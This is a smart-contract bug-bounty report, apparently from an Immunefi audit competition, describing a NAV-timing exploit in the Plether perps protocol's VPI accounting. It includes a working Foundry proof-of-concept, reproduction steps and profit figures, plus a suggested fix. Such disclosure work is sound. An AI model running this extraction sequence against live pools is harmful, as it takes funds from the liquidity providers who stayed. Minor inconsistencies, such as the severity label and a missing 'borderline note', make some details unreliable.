# \#99991 [SC-Critical] A skew-increasing open books its refundable VPI charge as un-reserved, immediately-distributable LP Revenue, letting a dominant junior LP redeem at the inflated NAV and then close to drain the rebate from the LPs who stayed

**Submitted on Nov 16th 2026 at 01:09:09 UTC by @Zenta for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99991
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Summary

When the attacker opens a skew-**increasing** position, the positive VPI charge `V` is booked as LP Revenue right away. No reserve is held for the part that is refundable on the later close. `executeOpen` records `tradeCostAssets - protocolFee` as a pool cash inflow of kind `Revenue` / `CashArrived` (`CfdEngineSettlementSidecar.sol:454-464`). The only VPI sub-ledger backs **negative** lifetime VPI, `max(-vpiAccrued, 0)` (`CfdEngineSettlementSidecar.sol:373-379`). It does not back this positive refundable part. The epoch LP NAV then rolls that Revenue into junior principal. `_settleLpEpoch` runs `_reconcile` (`HousePool.sol:835`) before pricing the redeem at `juniorPrincipal / supply` (`HousePool.sol:840-841`). There is no live junior-redeem fee: `_settlementFeeBps` returns 0 when not frozen (`HousePool.sol:1151-1152`). A later skew-**decreasing** close pays the VPI rebate back out of pool cash via `pool.payOut` (`CfdEngineSettlementSidecar.sol:621-624`).

An attacker who is the dominant junior LP does three things. (A) They open a skew-increasing position, so the positive VPI inflates the junior NAV. (B) They **redeem their own junior share at the inflated NAV**. (C) They **close** the position, so the rebate is paid out of the cash of the LPs who **stayed**. The mark is held **flat** (zero price PnL) for the whole round trip. The PoC measures a net attacker profit of **+252.43 USDG per cycle, net of all round-trip execution fees and carry**. The LPs who stayed lose **552.43 USDG** of aggregate backing. Settlement-token conservation is exact, and a passive-deployment control nets about zero. This is a net-profitable, repeatable extraction of LP funds at a flat mark, not market PnL.

## Finding Description

### A skew-increasing open books the refundable VPI charge as distributable Revenue with no reserve

On an open, the engine credits the pool with `tradeCostAssets - protocolFee` as an LP Revenue inflow marked `CashArrived`:

`CfdEngineSettlementSidecar.sol:454-464`
```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

`tradeCostAssets` on a skew-increasing open includes the positive VPI charge `V`. `V` is computed off the convex skew curve `C(S) = 0.5 * k * S^2 / D` (`CfdMath.sol:96-139`). That charge is **refundable**. The symmetric skew-decreasing close returns a VPI rebate. But the only reserve the engine holds against VPI is `_negativeVpiReserveTarget`. It is non-zero **only** for negative accrued VPI:

`CfdEngineSettlementSidecar.sol:373-379`
```solidity
function _negativeVpiReserveTarget(
    int256 vpiAccruedAssets
) private pure returns (uint256 targetAssets) {
    if (vpiAccruedAssets < 0) {
        targetAssets = uint256(-(vpiAccruedAssets + 1)) + 1;
    }
}
```

So the positive, refundable part of the open's VPI charge is booked as ordinary distributable pool Revenue. **Nothing** is held back for the refund. The documented design confirms the reserve covers only the negative side: "the separately funded VPI reserve backs only that account's typed VPI obligation ... backing below `max(-vpiAccrued, 0)`" (`SECURITY.md:1000-1001`).

### The epoch NAV folds that Revenue into junior principal, and there is no live redeem fee

`_settleLpEpoch` reconciles pool cash into tranche principal. It then prices the junior redeem phase off the fresh post-reconcile principal:

`HousePool.sol:835,840-841`
```solidity
_reconcile(accountingSnapshot, statusSnapshot);
// ...
RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
```

`_reconcile` distributes the `CashArrived` Revenue (the VPI charge) into `juniorPrincipal` before the redeem is priced at `juniorPrincipal / supply`. So the VPI bump raises the junior share price **in the same epoch it is booked**. The bump is permanent junior principal. It survives the one-hour junior deposit cooldown until the close drains it. Outside the frozen window there is no junior redeem fee to blunt this:

`HousePool.sol:1151-1152`
```solidity
if (!oracleFrozen) {
    return 0;
}
```

### The skew-decreasing close pays the VPI rebate back out of pool cash

When the attacker closes, the planner computes a negative `vpiDelta` (the refund). It is clamped only so lifetime VPI never goes negative (`CloseAccountingLib.sol:103-126`). The settlement path then pays the rebate directly out of pool cash:

`CfdEngineSettlementSidecar.sol:621-624`
```solidity
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

The attacker has **already redeemed** their junior share at the inflated NAV. So the rebate is drawn from the pool cash now backing the LPs who stayed. The lifetime clamp (`CloseAccountingLib.sol:116-118`) stops the attacker going net-negative on VPI. It does nothing to stop the **timing** capture. The open's Revenue was distributed and the redeem took its share before the clawback landed.

### Attack path (one account for both legs, fully unprivileged)

1. **Become the dominant junior LP.** The attacker deposits junior LP capital (PoC: `1,100,000 USDG`) alongside a staying victim LP (`800,000 USDG`). They fund their own wallet by `mint -> deposit`.
2. **Open a skew-increasing position.** The attacker opens a LONG of notional just under the `0.4 * D` skew cap (PoC: `750,000e18`, approximately `0.39 * D`). The positive VPI charge `V` is booked as pool Revenue. This raises the junior NAV, with **no reserve** held for the refund. The mark is held flat.
3. **Redeem the junior share at the inflated NAV.** After the one-hour deposit cooldown, the attacker redeems all junior shares. The redeem returns **more than the deposited principal** (PoC: `1,100,855.632 USDG` back on `1,100,000 USDG` in). This captures the un-reserved VPI bump. Mark still flat.
4. **Close the position.** The skew-decreasing close pays the VPI rebate out of pool cash (`CfdEngineSettlementSidecar.sol:621-624`). That cash is now the stayers'. Mark still flat, so the round trip has zero price PnL.

### Why this is not out of scope as a trusted-role action

The attacker is an ordinary junior LP and trader. They act through the public paths with their own capital. Being a junior LP is `deposit` into `juniorVault`. Opening and closing a position are ordinary trader orders through the public order path. Redeeming is `requestRedeem` / `claimRedeem`. The attack sets no privileged state. It does not pause, does not freeze the oracle, does not touch risk params, and calls no owner or keeper function. The only requirement beyond the launch config is that the attacker holds a **dominant share of the junior tranche**. That share is bought with the attacker's own capital on a public deposit path. It is not a role granted to them. No `onlyOwner`, `onlyRouter`, or keeper authority is used anywhere in the attack.

### Why this is not the accepted design / a known issue

This is a NAV-timing arbitrage on the **un-reserved positive VPI Revenue**. It is distinct from the accepted VPI items and from the documented VPI limitations:

- The accepted scan items **S-30** ("temporary pool liquidity reduces a skew-increasing close charge") and **S-31** ("temporary pool-liquidity reduction amplifies a skew-reducing close rebate") are **depth-manipulation** vectors. The attacker briefly changes pool depth `D` to move the size of the VPI charge or rebate on the convex curve (`CfdMath.sol:96-139`). This finding changes **neither depth nor the mark**. `D` and the price are held constant across the entire round trip. The defect is not curve manipulation. It is that the open's refundable charge is booked as distributable NAV and then paid back from pool cash, so a self-redeem **in the middle** captures it. The internal known-issue map records this distinction. It flags the NAV-timing variant as distinct from S-31.
- The documented VPI limitations state that "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips" and that negative lifetime VPI is reserved (`SECURITY.md:1434-1444`, `SECURITY.md:866-872`). Both protections are on the **negative/rebate-only** side. Both guard against a single trader round-tripping against a **static** LP base. Neither reserves the **positive** refundable charge. Neither considers the attacker being **the LP at the same time**. The design note "new close-time action rebates use only pool cash free after protecting existing trader claims" (`SECURITY.md:871`) is the leak. The rebate is paid from pool cash that the attacker already took out as an LP, with no reserve protecting the stayers.
- The prior-audit VPI round-trip tests (`VpiDepthTest`, `VpiRoundTripAccounting`, `VpiRebateReserve`) all exercise a single **trader** round trip against a static LP base. The lifetime clamp and the negative-VPI reserve block them. They do not model the **redeem-in-the-middle** by an attacker who is also the dominant junior LP. That redeem is what captures the un-reserved positive-VPI Revenue bump before the clawback reaches everyone else.

The root defect is therefore new relative to the accepted items. The refundable VPI portion is booked as distributable NAV with no reserve, then paid back from pool cash. This lets a self-redeem capture it from the stayers.

### This is a value transfer, not market PnL

The mark is asserted flat at open, redeem, and close (`engine.lastMarkPrice() == OPEN_PRICE`), so the round trip has zero price PnL. The attacker's gain is a direct subtraction from the pool value backing the remaining LPs. Exact settlement-token conservation at a flat mark confirms this. The stayers' aggregate loss equals the attacker's profit plus the execution fees the attack routes to the treasury.

## Impact Explanation

**Severity: High.** The extraction is positive **net of all round-trip execution fees and carry** (net-profitable, not just value moved between users). The LPs who stayed fund all of it. It repeats every epoch. So it is a standing, compounding drain on the LP pool, not a one-off.

Measured on-chain (launch config: `vpiFactor = 0.01e18`, `maxSkewRatio = 0.4e18`, confirmed in `script/DeployPerpsArbitrumSepolia.s.sol:434-446`; `baseCarryBps = 500`, `executionFeeBps = 4`, `protocolShareBps = 0`; 6-dec USDG; pool depth `1,902,000 USDG`; attacker junior `1,100,000 USDG` + trader margin `30,000 USDG`; staying victim LP `800,000 USDG`; skew-increasing LONG notional approximately `0.39 * D`; mark held flat the entire round trip):

| quantity | value (USDG) |
|---|---:|
| stored lifetime VPI charged on the open (booked as Revenue) | +1,478.707 |
| attacker junior deposited | 1,100,000.000 |
| attacker junior redeemed (at inflated NAV) | 1,100,855.632 |
| attacker net (ATTACK) | +252.414 |
| attacker net (CONTROL, passive) | -0.011 |
| **attacker profit vs passive baseline (net of all fees + carry)** | **+252.425** |
| remaining-LP backing (CONTROL) | 802,000.011 |
| remaining-LP backing (ATTACK) | 801,447.586 |
| **remaining-LP aggregate loss** | **552.425** |
| ...of which to the attacker | 252.425 |
| ...of which to treasury execution fees | 300.000 |

Settlement-token conservation is exact at the flat mark: `552.425 = 252.425 (attacker) + 300.000 (execution fees the attack shifts onto the stayers)`. The open charges `V` of about `8 bps * D` of Revenue into the junior NAV (`1,478.707 USDG`). The redeem takes the un-reserved slice of it. The round-trip execution fee of about `3.2 bps * D` is the main cost the attacker must clear. It still clears, leaving `+252.425 USDG` net. The attacker profit is about **1.33 bps of pool depth** per cycle. The stayers' aggregate loss is about **2.90 bps of pool depth** per cycle. In the CONTROL branch the attacker deploys the identical capital passively (no open, no redeem-timing, no close). The stayers keep their backing and the attacker nets about zero. This proves the entire ATTACK gain is the VPI-timing capture, not market PnL.

## Likelihood Explanation

Every step is an ordinary public action with the attacker's own capital: deposit to the junior vault, open and close an order, and redeem. No privileged role, no price move, and no owner or keeper cooperation is required. The launch config (`vpiFactor = 0.01e18`, `maxSkewRatio = 0.4e18`) enables VPI by default (`script/DeployPerpsArbitrumSepolia.s.sol:434-446`). The only standing precondition is a dominant junior share. That is just a large-enough deposit on a public path, and it pays off given the repeatable positive expected value. The attack is not front-running and nothing is raced. The attacker sequences their own open, redeem, and close across epochs they control. The practical frictions are the dominant-junior-share requirement and the one-hour directional exposure between open and redeem. Both are discussed in the borderline note above. Neither blocks the attack, and both are under the attacker's control.

## Recommendation

Reserve the refundable portion of a positive-VPI open, so it is not distributable until the lifetime VPI is final. Mirror the negative-VPI reserve target on the positive side. When an open accrues a positive VPI charge that is refundable on close, hold the refundable amount in a non-distributable reserve. `max(-vpiAccrued, 0)` already does this for the negative side at `CfdEngineSettlementSidecar.sol:373-379`. Do not book it as `CashArrived` Revenue that `_reconcile` folds into junior principal. Other fixes work too. Defer positive-VPI Revenue recognition until the position is closed and the refund is resolved. Or charge a junior redeem settlement fee or a short epoch delay outside the frozen window (today `_settlementFeeBps` returns 0, `HousePool.sol:1151-1152`), sized so that un-finalized VPI Revenue cannot be captured by a redeem landing between the open and the close. Any of these removes the timing window in which a self-redeem captures the open's refundable VPI charge from the LPs who stayed.

```solidity
// CfdEngineSettlementSidecar.executeOpen: do NOT book the refundable VPI portion as distributable Revenue.
// Hold the refundable positive-VPI charge in a non-distributable reserve (mirror _negativeVpiReserveTarget),
// and only recognize it as LP Revenue once the position closes and the lifetime VPI is final.
if (delta.tradeCostAssets > 0) {
    uint256 refundableVpiAssets = _refundablePositiveVpiReserveTarget(delta.vpiChargeAssets);
    uint256 poolCashInflowAssets =
        uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets - refundableVpiAssets;
    // ... book only poolCashInflowAssets as Revenue; hold refundableVpiAssets in a reserve until close.
}
```


## Proof of Concept

## Proof of Concept

The mark moves only through the authorized router path (`engine.updateMarkPrice`, called as `router`). `vpiFactor` is overridden from the `BasePerpTest` default of 0 to the launch `0.01e18`, so VPI is exercised at all. The flat mark is asserted at open, redeem, and close. A CONTROL branch deploys the identical capital passively from the same snapshot. So the measured profit is the difference against a passive baseline, with exact settlement-token conservation.

Reproduction steps:
```
# 1. Clone the in-scope repository at the audit commit
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive

# 2. Save the test below as packages/perps/test/perps/poc/H12VpiArbitrage.t.sol
#    (BasePerpTest.sol and the poc/ folder already exist in the repo; no other files are needed)

# 3. Run from the repository root (where foundry.toml lives)
FOUNDRY_TEST=packages/perps/test forge test --match-path "packages/perps/test/perps/poc/H12VpiArbitrage.t.sol" -vv
```

Full test source:
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console} from "forge-std/console.sol";

contract H11VpiRebateTest is BasePerpTest {

    // Attacker uses ONE account for both its LP leg and its trader leg (separate ledgers: vault shares vs
    // clearinghouse margin). Consolidated attacker wealth = settlementToken.balanceOf + clearinghouse.balanceAssets.
    address internal constant ATTACKER = address(0xA11CE);
    address internal constant VICTIM = address(0x711C); // a junior LP who STAYS through the round-trip

    uint256 internal constant ATTACKER_JUNIOR = 1_100_000e6;
    uint256 internal constant VICTIM_JUNIOR = 800_000e6;
    uint256 internal constant ATTACKER_MARGIN = 30_000e6;

    // Skew-increasing LONG. Notional at 1e8 = size/1e12 assets = 750_000e6 < maxSkew(=0.4*depth ~ 760_800e6).
    uint256 internal constant POS_SIZE = 750_000e18;
    uint256 internal constant OPEN_PRICE = 1e8; // mark held FLAT at 1.0 for the entire round trip

    // --- launch risk params (exercise VPI) ---
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18, // LAUNCH value (BasePerpTest default is 0). Source: DeployPerpsArbitrumSepolia.s.sol:436
            maxSkewRatio: 0.4e18, // LAUNCH value. Source: DeployPerpsArbitrumSepolia.s.sol:437
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500, // LAUNCH value
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0 // LAUNCH value: execution fees are retained as LP revenue, not skimmed to protocol
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0; // we control the entire junior LP composition
    }

    // ------------------------------------------------------------------ helpers

    function _refreshMark(uint256 price) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.prank(address(router));
        engine.updateMarkPrice(price, uint64(block.timestamp));
    }

    function _redeemAllJunior(address owner) internal returns (uint256 claimedAssets) {
        uint256 shares = juniorVault.maxRequestRedeem(owner);
        if (shares == 0) return 0;
        vm.prank(owner);
        uint256 requestId = juniorVault.requestRedeem(shares, owner, owner);

        uint256 epochStart = pool.lpEpochStart(requestId);
        if (block.timestamp < epochStart) vm.warp(epochStart);
        _refreshMark(OPEN_PRICE);
        _settleLpEpochForTest();

        uint256 claimableShares = juniorVault.claimableRedeemRequest(requestId, owner);
        if (claimableShares == 0) return 0;
        vm.prank(owner);
        claimedAssets = juniorVault.claimRedeem(requestId, claimableShares, owner, owner);
    }

    function _attackerWealth() internal view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER);
    }

    function _treasuryBalance() internal view returns (uint256) {
        return clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    // ------------------------------------------------------------------ main PoC

    struct BranchResult {
        int256 attackerNet; // attacker consolidated wealth (token + clearinghouse) minus capital in
        uint256 stayerBacking; // pool.totalAssets() AFTER the attacker has fully exited the pool as an LP
        uint256 treasuryBalance; // protocol-treasury settlement balance (execution-fee sink)
    }

    function test_H11_VpiRebate_LpVsLpTransfer() public {
        // Fund the junior book: attacker (dominant) + a victim LP who will stay through the round trip.
        _fundJunior(VICTIM, VICTIM_JUNIOR);
        _fundJunior(ATTACKER, ATTACKER_JUNIOR);
        _fundTrader(ATTACKER, ATTACKER_MARGIN);

        uint256 capitalIn = ATTACKER_JUNIOR + ATTACKER_MARGIN;
        uint256 depth = pool.totalAssets();
        console.log("pool depth (assets):", depth);
        console.log("attacker capital in :", capitalIn);

        uint256 snap = vm.snapshotState();

        // ===================== ATTACK BRANCH =====================
        BranchResult memory atk = _runAttack(capitalIn, depth);

        // ===================== CONTROL BRANCH =====================
        // Identical state and capital, but the attacker deploys PASSIVELY: no skew open/redeem/close.
        vm.revertToState(snap);
        BranchResult memory ctl = _runControl(capitalIn);

        // ------------------------------------------------------------------ results
        // No external money enters after funding (minting is identical in both branches) and the mark never moves,
        // so total system value is conserved across branches. The only sinks that can differ are the attacker, the
        // value left behind for the LPs who STAYED (pool.totalAssets), and the protocol treasury (execution-fee sink).
        int256 attackerProfit = atk.attackerNet - ctl.attackerNet; // attack profit vs passive baseline
        require(ctl.stayerBacking >= atk.stayerBacking, "stayers gained? unexpected");
        uint256 stayerLoss = ctl.stayerBacking - atk.stayerBacking; // remaining-LP aggregate NAV loss
        uint256 treasuryGain = atk.treasuryBalance - ctl.treasuryBalance; // execution fees the attack routes to treasury

        console.log("--- RESULTS (6-dec settlement token) ---");
        emit log_named_int("attacker net (ATTACK)  ", atk.attackerNet);
        emit log_named_int("attacker net (CONTROL) ", ctl.attackerNet);
        emit log_named_int("ATTACKER PROFIT vs passive baseline (net of ALL round-trip fees + carry)", attackerProfit);
        console.log("remaining-LP backing (CONTROL):", ctl.stayerBacking);
        console.log("remaining-LP backing (ATTACK) :", atk.stayerBacking);
        console.log("REMAINING-LP AGGREGATE LOSS   :", stayerLoss);
        console.log("  ...of which to ATTACKER      :", uint256(attackerProfit));
        console.log("  ...of which to TREASURY fees :", treasuryGain);

        // (1) Value transfer with the mark held FLAT (so it is NOT market P&L): the attacker ends richer than its
        //     deposited capital, and the LPs who stayed lose aggregate NAV.
        assertGt(atk.attackerNet, int256(0), "attacker ends richer than its deposited capital");
        assertGt(stayerLoss, 0, "the LPs who stayed lose aggregate NAV");
        assertGe(stayerLoss, uint256(attackerProfit), "stayers lose at least what the attacker gains");
        // Exact conservation (flat mark, no external money): staying-LP loss == attacker profit + treasury fee leak.
        assertApproxEqAbs(
            stayerLoss, uint256(attackerProfit) + treasuryGain, 1e6, "stayer loss == attacker profit + treasury fees"
        );

        // (2) HIGH — the extraction is net-profitable (repeatable), not merely redistributive:
        assertGt(attackerProfit, int256(0), "attacker profit is POSITIVE net of round-trip execution fees + carry");
    }

    function _runAttack(uint256 capitalIn, uint256 depth) internal returns (BranchResult memory r) {
        // (A) attacker opens a skew-INCREASING LONG. Positive VPI V is booked as pool Revenue (CashArrived),
        //     raising junior principal (= junior NAV/share) with NO reserve held for its refundable portion.
        _refreshMark(OPEN_PRICE);
        vm.warp(block.timestamp + 1);
        _open(ATTACKER, CfdTypes.Side.LONG, POS_SIZE, 20_000e6, OPEN_PRICE, pool.totalAssets());

        (,,,,,, int256 storedVpi) = engine.positions(ATTACKER);
        console.log("--- ATTACK ---");
        console.log("depth at open:", depth);
        emit log_named_int("stored lifetime VPI (accrued, += charge)", storedVpi);
        assertGt(storedVpi, int256(0), "skew-increasing open must accrue a POSITIVE (charge) VPI = pool Revenue");
        assertEq(engine.lastMarkPrice(), OPEN_PRICE, "mark is FLAT at open (no price move)");

        // (B) attacker redeems ALL junior shares at the VPI-inflated NAV. The Revenue bump is permanent junior
        //     principal until the close drains it, so it survives the 1h deposit cooldown. Mark stays FLAT.
        vm.warp(block.timestamp + 1 hours + 5 minutes); // clear the 1h junior deposit cooldown
        _refreshMark(OPEN_PRICE);
        uint256 redeemed = _redeemAllJunior(ATTACKER);
        console.log("attacker junior deposited   :", ATTACKER_JUNIOR);
        console.log("attacker junior redeemed    :", redeemed);
        assertGt(redeemed, ATTACKER_JUNIOR, "redeem at inflated NAV returns MORE than deposited principal");

        // (C) attacker closes the position -> VPI REBATE paid from POOL cash (pool.payOut), draining the stayers.
        _refreshMark(OPEN_PRICE);
        vm.warp(block.timestamp + 1);
        _close(ATTACKER, CfdTypes.Side.LONG, POS_SIZE, OPEN_PRICE, pool.totalAssets());
        (uint256 sizeAfter,,,,,,) = engine.positions(ATTACKER);
        assertEq(sizeAfter, 0, "position fully closed; attacker has fully exited the pool");
        assertEq(engine.lastMarkPrice(), OPEN_PRICE, "mark is FLAT at close (round trip has ZERO price P&L)");

        r.attackerNet = int256(_attackerWealth()) - int256(capitalIn);
        r.stayerBacking = pool.totalAssets(); // value left behind for the LPs who stayed (victim + seeds)
        r.treasuryBalance = _treasuryBalance();
        console.log("attacker wealth (token+clearinghouse):", _attackerWealth());
    }

    function _runControl(uint256 capitalIn) internal returns (BranchResult memory r) {
        // PASSIVE baseline: the attacker holds its trader margin idle and simply redeems its junior LP after the
        // same cooldown. No open, no VPI, no close. The mark is held at the same FLAT price.
        _refreshMark(OPEN_PRICE);
        vm.warp(block.timestamp + 1 hours + 5 minutes);
        _refreshMark(OPEN_PRICE);
        uint256 redeemed = _redeemAllJunior(ATTACKER);
        console.log("--- CONTROL (passive) ---");
        console.log("attacker junior redeemed (passive):", redeemed);

        r.attackerNet = int256(_attackerWealth()) - int256(capitalIn);
        r.stayerBacking = pool.totalAssets();
        r.treasuryBalance = _treasuryBalance();
    }

}
```

Result: `Suite result: ok. 1 passed; 0 failed`.

Console output:
```
stored lifetime VPI (accrued, += charge): 1478706624        # +V booked as Revenue on the open
attacker junior deposited   : 1100000000000
attacker junior redeemed    : 1100855632409                 # redeem at inflated NAV > deposit
attacker net (ATTACK)  :  252414469
attacker net (CONTROL) :     -10569                         # passive baseline ~ 0
ATTACKER PROFIT vs passive baseline (net of ALL round-trip fees + carry):  252425038
remaining-LP backing (CONTROL): 802000010569
remaining-LP backing (ATTACK) : 801447585531
REMAINING-LP AGGREGATE LOSS   :  552425038
  ...of which to ATTACKER      :  252425038
  ...of which to TREASURY fees :  300000000
```

What the output proves:
- The skew-increasing open accrues a **positive** lifetime VPI (`1,478,706,624` atoms), asserted positive, and is booked as `CashArrived` pool Revenue (`CfdEngineSettlementSidecar.sol:454-464`).
- The junior redeem returns **more than deposited** (`1,100,855.632` out on `1,100,000` in), asserted strictly greater. This captures the un-reserved VPI bump priced into `juniorPrincipal / supply` (`HousePool.sol:840-841`).
- With the mark held flat (asserted at open and close, zero price PnL), the attacker ends **net-positive** against a passive baseline (`+252.425 USDG`, asserted strictly greater than zero). So the extraction is net-profitable, not just value moved between users.
- The LPs who stayed lose `552.425 USDG` of aggregate backing (`pool.totalAssets()` after the attacker fully exits). Conservation is exact: `552.425 = 252.425 (attacker) + 300.000 (treasury fees)`, asserted to within rounding dust.
